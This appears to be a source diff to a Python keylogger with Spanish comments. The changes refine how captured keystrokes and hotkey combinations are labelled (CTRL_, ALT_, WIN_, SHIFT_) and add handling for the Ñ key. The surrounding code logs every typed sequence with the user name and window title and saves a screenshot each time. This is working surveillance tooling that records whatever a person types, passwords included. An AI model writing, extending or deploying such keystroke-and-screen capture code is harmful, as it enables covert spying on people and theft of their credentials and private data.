@@ -116,7 +116,9 @@ def get_key_str(key):
     elif hasattr(key, 'char') and key.char:
         return key.char  # Retornar el carácter de la tecla si existe
     elif hasattr(key, 'vk'):
-        if 47 < key.vk < 58:  # valores vk para las teclas numéricas 0-9
+        if hasattr(key, 'vk') and key.vk == 192:  # 192 suele ser el código vk para ñ en teclados en español
+            return 'Ñ'
+        elif 47 < key.vk < 58:  # valores vk para las teclas numéricas 0-9
             return str(key.vk - 48)  # Convertir el valor vk al número actual
         elif 95 < key.vk < 106:  # valores vk para las teclas numéricas del teclado numérico 0-9
             return str(key.vk - 96)  # Convertir el valor vk al número actual
@@ -127,7 +129,7 @@ def get_key_str(key):
 
 # Mapeo de caracteres de control a combinaciones de teclas
 control_char_mapping = {
-    chr(i): f'CTRL + {chr(i + 64)}' for i in range(1, 27)
+    chr(i): f'CTRL_{chr(i + 64)}' for i in range(1, 27)
 }
 
 def translate_control_chars(char_sequence):
@@ -154,21 +156,16 @@ def logKeyboard():
             # Construye la secuencia de teclas presionadas
             typed_sequence = []
             for i, key in enumerate(pressed_keys):
-                if i > 0 and (is_special_or_space(pressed_keys[i - 1]) or is_special_or_space(key)):
-                    typed_sequence.append('+')
+                if i > 0:
+                    prev_key = pressed_keys[i - 1]
+                    if is_special_or_space(prev_key) or is_special_or_space(key):
+                        typed_sequence.append('+')
+                    elif prev_key.endswith(('CTRL', 'ALT', 'SHIFT', 'WIN')) or key.startswith(
+                            ('CTRL', 'ALT', 'SHIFT', 'WIN')):
+                        typed_sequence.append(' + ')  # Añade un espacio entre las combinaciones de teclas
                 typed_sequence.append(key)
 
             typed_word = ''.join(typed_sequence)
-
-            # Verificar si 'C T R L + ' ya está en typed_word
-            if 'C T R L   +   ' not in typed_word:
-                if any(c in control_char_mapping for c in typed_word):
-                    typed_word = translate_control_chars(typed_word)  # Traducir caracteres de control solo si es necesario
-  
-            # Corregir la secuencia incorrecta
-            incorrect_sequence = 'C T R L   +   '
-            if typed_word.startswith(incorrect_sequence):
-                typed_word = typed_word[len(incorrect_sequence):]  # Eliminar la secuencia incorrecta
 
             img = sc.take_screenshot(save_image=True)
             print(f"{timestamp()} {USER} {window_name} typed: {typed_word}")
@@ -205,7 +202,7 @@ def logKeyboard():
 
             # Para Ctrl + Alt + Letra, registrar la combinación
             if alt_gr_pressed and key_char.isalpha():
-                hotkey_str = 'CTRL + ALT + ' + key_char
+                hotkey_str = 'CTRL_ALT_' + key_char
                 pressed_keys.append(hotkey_str)
             # Para AltGr + número (u otros caracteres), registrar solo el carácter resultante
             elif alt_gr_pressed and not key_char.isalpha():
@@ -215,13 +212,13 @@ def logKeyboard():
                 # Para otras combinaciones, construir y registrar la combinación
                 hotkey_str = ''
                 if modifier_state['ctrl']:
-                    hotkey_str += 'CTRL + '
+                    hotkey_str += 'CTRL_'
                 if modifier_state['alt']:
-                    hotkey_str += 'ALT + '
+                    hotkey_str += 'ALT_'
                 if modifier_state['win']:
-                    hotkey_str += 'WIN + '
+                    hotkey_str += 'WIN_'
                 if modifier_state['shift']:
-                    hotkey_str += 'SHIFT + '
+                    hotkey_str += 'SHIFT_'
 
                 hotkey_str += key_char
                 pressed_keys.append(hotkey_str)
